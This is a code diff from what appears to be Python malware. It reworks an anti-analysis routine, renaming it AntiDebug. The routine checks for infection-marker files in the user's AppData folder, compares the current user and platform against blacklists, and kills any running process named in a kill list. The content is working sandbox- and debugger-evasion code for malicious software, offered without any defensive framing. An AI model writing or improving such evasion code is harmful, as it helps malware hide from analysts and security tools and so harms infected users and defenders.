@@ -18,7 +18,6 @@ import subprocess
 import requests
 import platform
 import json
-from psutil import NoSuchProcess,process_iter,AccessDenied
 
 
 
@@ -180,7 +179,16 @@ def checkPlatform():
 
 
 
-def CheckVirtual():  
+def AntiDebug(oneStart):  
+
+    pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+
+    if oneStart:
+        if (os.path.exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):# Checks if a virus has opened on this PC
+            return True
+    if os.path.exists(rf'{pathf}\windll'):
+        return True
+
     processlist = psutil.process_iter(['name'])
 
     if os.getenv("USERPROFILE") in blacklisted_Users:
@@ -250,11 +258,11 @@ def CheckVirtual():
     if checkPlatform() in blacklisted_Platform:
         return True
     
-    for proc in process_iter():
+    for proc in processlist:
             if any(procstr in proc.name().lower() for procstr in kill_Processes):
                 try:
                     proc.kill()
-                except (NoSuchProcess, AccessDenied):
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
                     pass
     return False
 
